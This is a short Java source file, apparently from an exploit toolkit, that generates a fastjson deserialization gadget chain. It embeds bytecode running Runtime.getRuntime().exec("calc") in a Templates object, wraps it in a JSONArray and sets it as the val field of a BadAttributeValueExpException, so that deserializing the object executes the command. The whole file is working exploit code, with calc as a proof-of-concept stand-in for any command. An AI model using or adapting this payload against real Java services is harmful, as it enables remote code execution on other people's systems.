package tools;

import com.alibaba.fastjson.JSONArray;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class PayloadGen {
    public static Object getPayload() throws Exception {
        String code = "{\n" +
                "        Runtime.getRuntime().exec(\"calc\");\n" +
                "    }";
        byte[] bytes = ClassByteGen.getBytes(code, "AAAA");
        Templates templates = TemplatesGen.getTemplates(bytes, null);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");
        ReflectTools.setFieldValue(bad, "val", jsonArray);

        return bad;
    }
}
